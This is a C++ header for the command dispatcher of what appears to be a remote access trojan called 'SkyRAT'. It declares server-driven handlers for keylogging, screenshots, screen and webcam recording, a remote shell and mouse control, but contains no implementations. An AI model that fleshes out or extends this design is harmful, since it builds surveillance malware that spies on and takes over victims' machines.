#pragma once

#include <string>
#include <map>
#include <functional>
#include <memory>
#include <vector>
#include <winsock2.h>

// Forward declarations to avoid circular dependencies
// Full includes are in the .cpp file

namespace SkyRAT {
namespace Core {

// Forward declarations
class ConnectionManager;

}

namespace Modules {
    class IModule;
    class ModuleManager;
}

namespace Core {

/**
 * @brief CommandDispatcher handles command parsing, routing, and execution
 * 
 * This class extracts the massive handle_command function from legacy client.cpp
 * and provides a clean, extensible interface for processing server commands.
 * It integrates with the new module system and handles both built-in commands
 * and module-specific commands.
 */
class CommandDispatcher {
public:
    /**
     * @brief Command result status codes
     */
    enum class CommandResult {
        SUCCESS = 0,
        FAILURE = 1,
        UNKNOWN_COMMAND = 2,
        INVALID_PARAMETERS = 3,
        MODULE_ERROR = 4,
        CONNECTION_ERROR = 5
    };

    /**
     * @brief Command execution context
     */
    struct CommandContext {
        std::string rawCommand;
        std::string command;
        std::vector<std::string> arguments;
        SOCKET socket;
        ConnectionManager* connectionManager;
        
        CommandContext(const std::string& raw, SOCKET sock, ConnectionManager* connMgr)
            : rawCommand(raw), socket(sock), connectionManager(connMgr) {}
    };

    /**
     * @brief Command handler function signature
     */
    using CommandHandler = std::function<CommandResult(const CommandContext&)>;

    /**
     * @brief Constructor
     * @param moduleManager Reference to the module manager for module commands
     * @param connectionManager Reference to connection manager for network operations
     */
    CommandDispatcher(SkyRAT::Modules::ModuleManager& moduleManager, ConnectionManager& connectionManager);
    
    /**
     * @brief Destructor
     */
    ~CommandDispatcher();

    // === Core Command Processing ===

    /**
     * @brief Process a command received from the server
     * @param rawCommand The raw command string received
     * @param socket The socket connection for responses
     * @return CommandResult indicating success/failure
     */
    CommandResult processCommand(const std::string& rawCommand, SOCKET socket);

    /**
     * @brief Register a custom command handler
     * @param command The command name (case-sensitive)
     * @param handler The function to handle this command
     * @return true if registered successfully, false if command already exists
     */
    bool registerCommand(const std::string& command, CommandHandler handler);

    /**
     * @brief Unregister a command handler
     * @param command The command name to remove
     * @return true if unregistered successfully, false if command didn't exist
     */
    bool unregisterCommand(const std::string& command);

    /**
     * @brief Check if a command is registered
     * @param command The command name to check
     * @return true if command is registered
     */
    bool isCommandRegistered(const std::string& command) const;

    /**
     * @brief Get list of all registered commands
     * @return Vector of command names
     */
    std::vector<std::string> getRegisteredCommands() const;

    // === Command Parsing ===

    /**
     * @brief Parse raw command into components
     * @param rawCommand The raw command string
     * @return CommandContext with parsed components
     */
    CommandContext parseCommand(const std::string& rawCommand, SOCKET socket) const;

    /**
     * @brief Split command arguments
     * @param commandLine The command line to split
     * @return Vector of arguments
     */
    std::vector<std::string> splitArguments(const std::string& commandLine) const;

    // === Response Handling ===

    /**
     * @brief Send success response to server
     * @param socket The socket to send response on
     * @param message Optional success message
     */
    void sendSuccessResponse(SOCKET socket, const std::string& message = "") const;

    /**
     * @brief Send error response to server
     * @param socket The socket to send response on
     * @param error Error message
     * @param errorCode Optional error code
     */
    void sendErrorResponse(SOCKET socket, const std::string& error, int errorCode = -1) const;

    /**
     * @brief Send command result response
     * @param socket The socket to send response on
     * @param result The command result
     * @param message Additional message
     */
    void sendCommandResult(SOCKET socket, CommandResult result, const std::string& message = "") const;

private:
    // === Built-in Command Handlers ===
    
    /**
     * @brief Handle screenshot command
     */
    CommandResult handleScreenshot(const CommandContext& context);
    
    /**
     * @brief Handle keylogger start command
     */
    CommandResult handleStartKeylogger(const CommandContext& context);
    
    /**
     * @brief Handle keylogger stop command
     */
    CommandResult handleStopKeylogger(const CommandContext& context);
    
    /**
     * @brief Handle screen recording start command
     */
    CommandResult handleStartScreenRecording(const CommandContext& context);
    
    /**
     * @brief Handle screen recording stop command
     */
    CommandResult handleStopScreenRecording(const CommandContext& context);
    
    /**
     * @brief Handle remote shell start command
     */
    CommandResult handleStartRemoteShell(const CommandContext& context);
    
    /**
     * @brief Handle remote shell stop command
     */
    CommandResult handleStopRemoteShell(const CommandContext& context);
    
    /**
     * @brief Handle webcam start command
     */
    CommandResult handleStartWebcam(const CommandContext& context);
    
    /**
     * @brief Handle webcam stop command
     */
    CommandResult handleStopWebcam(const CommandContext& context);
    
    /**
     * @brief Handle mouse commands
     */
    CommandResult handleMouseCommand(const CommandContext& context);
    
    /**
     * @brief Handle unknown commands (echo back)
     */
    CommandResult handleUnknownCommand(const CommandContext& context);

    // === Helper Functions ===
    
    /**
     * @brief Register all built-in commands
     */
    void registerBuiltinCommands();
    
    /**
     * @brief Trim whitespace and newlines from command
     */
    std::string trimCommand(const std::string& command) const;
    
    /**
     * @brief Log command execution
     */
    void logCommand(const std::string& command, CommandResult result) const;

    // === Member Variables ===
    
    /// Map of registered command handlers
    std::map<std::string, CommandHandler> m_commandHandlers;
    
    /// Reference to module manager for module commands
    SkyRAT::Modules::ModuleManager& m_moduleManager;
    
    /// Reference to connection manager for network operations
    ConnectionManager& m_connectionManager;
    
    /// Command execution statistics
    mutable std::map<std::string, size_t> m_commandStats;
};

} // namespace Core
} // namespace SkyRAT